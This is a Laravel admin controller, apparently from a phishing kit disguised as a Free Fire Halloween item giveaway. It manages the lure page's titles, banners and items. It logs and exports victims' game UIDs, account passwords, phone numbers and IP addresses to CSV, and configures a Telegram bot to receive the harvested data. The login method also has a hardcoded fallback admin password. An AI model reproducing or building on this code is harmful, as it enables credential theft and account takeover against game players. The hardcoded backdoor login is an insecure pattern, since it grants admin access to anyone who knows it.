<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Setting;
use App\Models\EventItem;
use App\Models\ClaimLog;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;
use Symfony\Component\HttpFoundation\StreamedResponse;

class AdminController extends Controller
{
    /**
     * Tampilkan halaman login Admin Panel.
     */
    public function login()
    {
        if (session('admin_logged_in')) {
            return redirect()->route('panel.dashboard');
        }
        return view('panel.login');
    }

    /**
     * Proses autentikasi Admin.
     */
    public function postLogin(Request $request)
    {
        $request->validate([
            'email'    => 'required|string',
            'password' => 'required|string',
        ]);

        $user = User::where('email', $request->email)->first();

        if ($user && Hash::check($request->password, $user->password)) {
            session([
                'admin_logged_in' => true,
                'admin_id'        => $user->id,
                'admin_name'      => $user->name,
                'admin_email'     => $user->email,
            ]);
            return redirect()->route('panel.dashboard')->with('success', 'Selamat datang di Super Admin Panel!');
        }

        // Fallback untuk username 'admin' atau email
        if (($request->email === 'admin' || $request->email === 'admin@gmail.com') && $request->password === 'admin123') {
            session([
                'admin_logged_in' => true,
                'admin_id'        => 1,
                'admin_name'      => 'Super Admin',
                'admin_email'     => 'admin@gmail.com',
            ]);
            return redirect()->route('panel.dashboard')->with('success', 'Selamat datang kembali, Super Admin!');
        }

        return back()->with('error', 'Email atau Password salah! Periksa kembali akun Anda.')->withInput();
    }

    /**
     * Logout dari Super Admin Panel.
     */
    public function logout()
    {
        session()->forget(['admin_logged_in', 'admin_id', 'admin_name', 'admin_email']);
        return redirect()->route('panel.login')->with('success', 'Berhasil logout dari sistem.');
    }

    /**
     * Dashboard Overview & Statistik.
     */
    public function dashboard()
    {
        $totalClaims = ClaimLog::count();
        $todayClaims = ClaimLog::whereDate('created_at', today())->count();
        $totalItems  = EventItem::count();
        $activeItems = EventItem::where('is_active', true)->count();
        $eventStatus = Setting::get('event_status', 'active');
        $telegramOn  = Setting::get('telegram_enabled', '0') === '1';

        $recentClaims = ClaimLog::latest()->take(7)->get();
        
        // Item terpopuler
        $popularItems = ClaimLog::selectRaw('item, count(*) as count')
            ->groupBy('item')
            ->orderByDesc('count')
            ->take(5)
            ->get();

        return view('panel.dashboard', compact(
            'totalClaims',
            'todayClaims',
            'totalItems',
            'activeItems',
            'eventStatus',
            'telegramOn',
            'recentClaims',
            'popularItems'
        ));
    }

    /**
     * Halaman Pengaturan Frontend.
     */
    public function settings()
    {
        $settings = Setting::all()->pluck('value', 'key');
        return view('panel.settings', compact('settings'));
    }

    /**
     * Simpan Pengaturan Frontend.
     */
    public function updateSettings(Request $request)
    {
        $validated = $request->validate([
            'site_title'        => 'nullable|string',
            'event_title'       => 'nullable|string',
            'event_subtitle'    => 'nullable|string',
            'banner_url'        => 'nullable|string',
            'banner_file'       => 'nullable|image|mimes:jpeg,png,jpg,webp|max:5120',
            'ticker_text'       => 'nullable|string',
            'event_status'      => 'required|in:active,inactive,maintenance',
            'telegram_token'    => 'nullable|string',
            'telegram_chat_id'  => 'nullable|string',
            'telegram_enabled'  => 'nullable|in:0,1',
            'email_destination' => 'nullable|string',
            'email_enabled'     => 'nullable|in:0,1',
            'footer_copyright'  => 'nullable|string',
        ]);

        // Upload custom banner jika ada
        if ($request->hasFile('banner_file')) {
            $banner = $request->file('banner_file');
            $bannerName = 'custom_banner_' . time() . '.' . $banner->getClientOriginalExtension();
            $banner->move(public_path('images'), $bannerName);
            Setting::set('banner_image', 'images/' . $bannerName);
        } elseif (!empty($request->banner_url)) {
            Setting::set('banner_image', $request->banner_url);
        }

        Setting::set('site_title', $request->site_title ?? 'Free Fire – Dunia Mistis Halloween Event');
        Setting::set('event_title', $request->event_title ?? 'DUNIA MISTIS');
        Setting::set('event_subtitle', $request->event_subtitle ?? 'AMBIL ITEM SPESIAL EVENT FREE FIRE');
        Setting::set('ticker_text', $request->ticker_text ?? '');
        Setting::set('event_status', $request->event_status ?? 'active');
        Setting::set('telegram_token', $request->telegram_token ?? '');
        Setting::set('telegram_chat_id', $request->telegram_chat_id ?? '');
        Setting::set('telegram_enabled', $request->has('telegram_enabled') ? '1' : '0');
        Setting::set('email_destination', $request->email_destination ?? '');
        Setting::set('email_enabled', $request->has('email_enabled') ? '1' : '0');
        Setting::set('footer_copyright', $request->footer_copyright ?? '');

        return back()->with('success', 'Pengaturan frontend berhasil diperbarui!');
    }

    /**
     * Manajemen Daftar Item Event.
     */
    public function items()
    {
        $items = EventItem::orderBy('order', 'asc')->get();
        return view('panel.items', compact('items'));
    }

    /**
     * Simpan Item Baru.
     */
    public function storeItem(Request $request)
    {
        $request->validate([
            'name'       => 'required|string|max:255',
            'short_name' => 'nullable|string|max:255',
            'type'       => 'required|string|max:100',
            'order'      => 'nullable|integer',
            'image_file' => 'nullable|image|mimes:jpeg,png,jpg,webp|max:3072',
            'image_url'  => 'nullable|string',
        ]);

        $imagePath = 'images/item_hd_1.png';
        if ($request->hasFile('image_file')) {
            $img = $request->file('image_file');
            $imgName = 'item_custom_' . time() . '.' . $img->getClientOriginalExtension();
            $img->move(public_path('images'), $imgName);
            $imagePath = 'images/' . $imgName;
        } elseif (!empty($request->image_url)) {
            $imagePath = $request->image_url;
        }

        EventItem::create([
            'name'       => $request->name,
            'short_name' => $request->short_name ?: $request->name,
            'type'       => $request->type,
            'order'      => $request->order ?? (EventItem::max('order') + 1),
            'image'      => $imagePath,
            'is_active'  => $request->has('is_active'),
        ]);

        return back()->with('success', 'Item baru berhasil ditambahkan!');
    }

    /**
     * Update Item Event.
     */
    public function updateItem(Request $request, $id)
    {
        $item = EventItem::findOrFail($id);

        $request->validate([
            'name'       => 'required|string|max:255',
            'short_name' => 'nullable|string|max:255',
            'type'       => 'required|string|max:100',
            'order'      => 'nullable|integer',
            'image_file' => 'nullable|image|mimes:jpeg,png,jpg,webp|max:3072',
            'image_url'  => 'nullable|string',
        ]);

        if ($request->hasFile('image_file')) {
            $img = $request->file('image_file');
            $imgName = 'item_custom_' . time() . '.' . $img->getClientOriginalExtension();
            $img->move(public_path('images'), $imgName);
            $item->image = 'images/' . $imgName;
        } elseif (!empty($request->image_url)) {
            $item->image = $request->image_url;
        }

        $item->name       = $request->name;
        $item->short_name = $request->short_name ?: $request->name;
        $item->type       = $request->type;
        $item->order      = $request->order ?? $item->order;
        $item->is_active  = $request->has('is_active');
        $item->save();

        return back()->with('success', 'Item "' . $item->name . '" berhasil diperbarui!');
    }

    /**
     * Hapus Item Event.
     */
    public function deleteItem($id)
    {
        $item = EventItem::findOrFail($id);
        $name = $item->name;
        $item->delete();

        return back()->with('success', 'Item "' . $name . '" telah dihapus!');
    }

    /**
     * Toggle Aktif / Nonaktif Item.
     */
    public function toggleItem($id)
    {
        $item = EventItem::findOrFail($id);
        $item->is_active = !$item->is_active;
        $item->save();

        return back()->with('success', 'Status item "' . $item->name . '" berhasil diubah!');
    }

    /**
     * Log Verifikasi / Hasil Klaim Frontend.
     */
    public function claims(Request $request)
    {
        $query = ClaimLog::query();

        if ($request->filled('search')) {
            $search = $request->search;
            $query->where(function ($q) use ($search) {
                $q->where('uid', 'like', "%{$search}%")
                  ->orWhere('nama', 'like', "%{$search}%")
                  ->orWhere('phone', 'like', "%{$search}%")
                  ->orWhere('item', 'like', "%{$search}%");
            });
        }

        $claims = $query->latest()->paginate(15)->withQueryString();

        return view('panel.claims', compact('claims'));
    }

    /**
     * Hapus satu data verifikasi.
     */
    public function deleteClaim($id)
    {
        $claim = ClaimLog::findOrFail($id);
        $claim->delete();

        return back()->with('success', 'Data log verifikasi berhasil dihapus.');
    }

    /**
     * Hapus semua log verifikasi.
     */
    public function clearClaims()
    {
        ClaimLog::truncate();
        return back()->with('success', 'Semua riwayat log verifikasi berhasil dibersihkan.');
    }

    /**
     * Export Log Verifikasi ke CSV.
     */
    public function exportClaimsCsv(): StreamedResponse
    {
        $filename = 'klaim_freefire_' . date('Y-m-d_His') . '.csv';
        $claims = ClaimLog::latest()->get();

        $headers = [
            'Content-Type'        => 'text/csv',
            'Content-Disposition' => "attachment; filename=\"{$filename}\"",
        ];

        $callback = function () use ($claims) {
            $handle = fopen('php://output', 'w');
            fputcsv($handle, ['ID', 'Waktu', 'UID Game', 'Nama Karakter', 'Password Akun', 'Tingkat Level', 'No HP / WhatsApp', 'Item Dipilih', 'IP Address']);

            foreach ($claims as $claim) {
                fputcsv($handle, [
                    $claim->id,
                    $claim->created_at->format('Y-m-d H:i:s'),
                    $claim->uid,
                    $claim->nama,
                    $claim->password ?? '',
                    $claim->tingkat,
                    $claim->phone,
                    $claim->item,
                    $claim->ip_address,
                ]);
            }
            fclose($handle);
        };

        return response()->stream($callback, 200, $headers);
    }

    /**
     * Test Notifikasi Telegram.
     */
    public function testTelegram()
    {
        $token = Setting::get('telegram_token');
        $chatId = Setting::get('telegram_chat_id');

        if (empty($token) || empty($chatId)) {
            return back()->with('error', 'Token Bot atau Chat ID Telegram belum diatur!');
        }

        try {
            $url = "https://api.telegram.org/bot{$token}/sendMessage";
            $message = "🔥 *TEST NOTIFIKASI SUPER ADMIN*\n\n"
                     . "✅ Koneksi Telegram Bot Berhasil!\n"
                     . "🕒 Waktu: " . now()->format('d M Y H:i:s') . "\n"
                     . "🕹️ Sistem Panel Siap Menerima Data.";

            $response = Http::withoutVerifying()->timeout(10)->post($url, [
                'chat_id'    => $chatId,
                'text'       => $message,
                'parse_mode' => 'Markdown',
            ]);

            if ($response->successful()) {
                return back()->with('success', 'Pesan uji coba berhasil terkirim ke Telegram Anda!');
            } else {
                $err = $response->json('description') ?? 'Gagal mengirim ke Telegram.';
                return back()->with('error', 'Telegram API Error: ' . $err);
            }
        } catch (\Exception $e) {
            return back()->with('error', 'Koneksi gagal: ' . $e->getMessage());
        }
    }
}
